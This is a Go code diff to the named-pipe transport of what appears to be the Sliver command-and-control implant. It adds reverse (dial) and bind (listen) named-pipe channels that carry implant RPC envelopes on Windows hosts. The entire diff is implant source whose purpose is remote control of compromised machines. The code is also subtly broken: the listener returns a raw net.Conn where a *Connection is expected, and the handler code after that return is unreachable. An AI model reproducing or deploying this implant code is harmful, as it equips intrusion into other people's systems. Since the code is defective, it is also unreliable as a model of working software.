@@ -23,6 +23,8 @@ package transports
 import (
 	"bytes"
 	"encoding/binary"
+	"errors"
+	"fmt"
 	"io"
 	"net"
 	"net/url"
@@ -44,12 +46,72 @@ const (
 	writeBufSizeNamedPipe = 1024
 )
 
-// namedPipeConnect - Reverse Named Pipe implant transport (Windows only)
-func namedPipeConnect(uri *url.URL) (*Connection, error) {
-	conn, err := namePipeDial(uri)
+// namedPipeDial - Reverse Named Pipe implant transport (Windows only)
+func namedPipeDial(uri *url.URL) (*Connection, error) {
+	address := uri.String()
+	address = strings.ReplaceAll(address, "namedpipe://", "")
+	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
+	// {{if .Config.Debug}}
+	log.Print("Named pipe address: ", address)
+	// {{end}}
+	conn, err := winio.DialPipe(address, nil)
 	if err != nil {
 		return nil, err
 	}
+
+	// Set up RPC read/write loop over the named pipe.
+	connection, err := handleNamePipeConnection(conn)
+	if err != nil {
+		return nil, fmt.Errorf("failed to connect over named pipe: %s", err.Error())
+	}
+	if connection == nil {
+		return nil, errors.New("failed to connect over named pipe (unknown reason)")
+	}
+
+	return connection, nil
+}
+
+// namedPipeListen - Bind Named Pipe implant transport (Windows only)
+func namedPipeListen(uri *url.URL) (*Connection, error) {
+
+	address := uri.String()
+	address = strings.ReplaceAll(address, "namedpipe://", "")
+	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
+	// {{if .Config.Debug}}
+	log.Print("Named pipe listener address: ", address)
+	// {{end}}
+
+	ln, err := winio.ListenPipe("\\\\.\\pipe\\"+address, nil)
+	// {{if .Config.Debug}}
+	log.Printf("Listening on %s", "\\\\.\\pipe\\"+address)
+	// {{end}}
+	if err != nil {
+		return nil, err
+	}
+
+	for {
+		// Wait for only one server connection, and return after setting it up.
+		conn, err := ln.Accept()
+		if err != nil {
+			return nil, err
+		}
+		return conn, nil
+
+		// Set up RPC read/write loop over the named pipe.
+		connection, err := handleNamePipeConnection(conn)
+		if err != nil {
+			return nil, fmt.Errorf("failed to connect over named pipe: %s", err.Error())
+		}
+		if connection == nil {
+			return nil, errors.New("failed to connect over named pipe (unknown reason)")
+		}
+
+		return connection, nil
+	}
+}
+
+func handleNamePipeConnection(conn net.Conn) (*Connection, error) {
+
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
 	ctrl := make(chan bool, 1)
@@ -135,16 +197,6 @@ func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 		}
 	}
 	return nil
-}
-
-func namePipeDial(uri *url.URL) (net.Conn, error) {
-	address := uri.String()
-	address = strings.ReplaceAll(address, "namedpipe://", "")
-	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
-	// {{if .Config.Debug}}
-	log.Print("Named pipe address: ", address)
-	// {{end}}
-	return winio.DialPipe(address, nil)
 }
 
 func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
